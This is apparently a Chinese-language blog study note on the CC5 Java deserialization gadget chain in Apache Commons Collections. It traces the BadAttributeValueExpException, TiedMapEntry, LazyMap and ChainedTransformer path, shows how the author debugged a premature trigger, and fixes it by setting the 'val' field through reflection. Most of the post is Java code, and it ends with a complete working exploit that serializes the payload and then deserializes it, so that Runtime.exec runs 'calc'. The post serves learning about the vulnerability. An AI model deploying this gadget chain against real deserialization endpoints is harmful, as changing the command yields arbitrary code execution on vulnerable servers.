---
title: "CC5 学习笔记"
date: "2026-11-13 17:56:31"
updated: "2026-11-13 17:56:31"
permalink: "2026/11/13/cc5-study/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC5"]
description: "CC5 学习记录：围绕 BadAttributeValueExpException、TiedMapEntry 与 LazyMap 梳理调用链，记录构造时提前触发的问题和反射设置 val 的实验过程。"
excerpt: "CC5 学习记录：围绕 BadAttributeValueExpException、TiedMapEntry 与 LazyMap 梳理调用链，记录构造时提前触发的问题和反射设置 val 的实验过程。"
obsidian_source: "cc5.md"
---

最后两个链了，cc3本质上就是cc1换了一个入口类来完成的，所以中后端内容没有什么区别
我们先把中后部分的内容写好
```java
import com.sun.org.apache.xml.internal.security.encryption.Transforms;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
public  class cc5 {  
    public static void main(String[] args) throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod"  
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),  
                new InvokerTransformer("exec"  
                        , new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        Map decoratelazymap = LazyMap.decorate(hashMap, chainedTransformer);  
        Class<? extends Map> lazymapClass = decoratelazymap.getClass();  
        Method get = lazymapClass.getMethod("get", Object.class);  
        get.invoke(decoratelazymap,chainedTransformer);  
        new TiedMapEntry()  
  
    }  
}
```
```text
ObjectInputStream.readObject()
└─ BadAttributeValueExpException.readObject()        // JDK 自带 javax.management
   └─ val.toString()                                  // val 已被反射替换成 TiedMapEntry
      └─ TiedMapEntry.toString()                      // = getKey() + "=" + getValue()
         └─ TiedMapEntry.getValue()
            └─ LazyMap.get("foo")                     // key 不在 innerMap 中
               └─ ChainedTransformer.transform("foo")
                  ├─ ConstantTransformer(Runtime.class)
                  ├─ InvokerTransformer("getMethod", ["getRuntime"])
                  ├─ InvokerTransformer("invoke", [])          // Runtime.getRuntime()
                  ├─ InvokerTransformer("exec", [cmd])         // 执行命令
                  └─ ConstantTransformer(1)                    // 兜底返回值
```
上面就是这条利用链的一个思路
我们接着写，当然了这里是参考了利用链的，这里不太好进行逆向分析就直接正着写了
```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {  
    ObjectInputStream.GetField gf = ois.readFields();  
    Object valObj = gf.get("val", null);  
  
    if (valObj == null) {  
        val = null;  
    } else if (valObj instanceof String) {  
        val= valObj;  
    } else if (System.getSecurityManager() == null  
            || valObj instanceof Long  
            || valObj instanceof Integer  
            || valObj instanceof Float  
            || valObj instanceof Double  
            || valObj instanceof Byte  
            || valObj instanceof Short  
            || valObj instanceof Boolean) {  
        val = valObj.toString();  
    } else { // the serialized object is from a version without JDK-8019292 fix  
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();  
    }
```
我们可以看到这个入口里面是利用了tostring这个方法，这也是我们继续前行的····
不说这么多，接着写
构造方法是public的，直接构造
```java
import com.sun.org.apache.xml.internal.security.encryption.Transforms;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
  
import javax.management.BadAttributeValueExpException;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
public  class cc5 {  
    public static void main(String[] args) throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod"  
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),  
                new InvokerTransformer("exec"  
                        , new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        Map decoratelazymap = LazyMap.decorate(hashMap, chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratelazymap, "nihao");  
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry);  
  
  
  
    }  
}
```
这是我一开始写的，直接就给我碳计算器了，给我整懵了，打断点看一下，发现在new这个类的时候就执行了tostring，还不能直接写，我还纳闷原版的链为什么要通过反射填写这个参数，我本以为我是天才的，没想过·····
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;                 // 新增
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class cc5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decoratelazymap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratelazymap, "nihao");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class<? extends BadAttributeValueExpException> badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();
        Field val = badAttributeValueExpExceptionClass.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        // ===== 序列化：只是把对象图写成字节，不会触发 =====
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(badAttributeValueExpException);
        oos.close();
        System.out.println("serialized bytes = " + bos.size());

        // ===== 反序列化：这里才触发 readObject → toString → ... → exec =====
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));
        ois.readObject();
        ois.close();
        System.out.println("done");
    }
}
```
这是最终的exp

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/) · [cc4链的学习](/2026/11/06/cc4-study/) · [cc2学习](/2026/11/10/cc2-study/) · [CC5 学习笔记](/2026/11/13/cc5-study/)
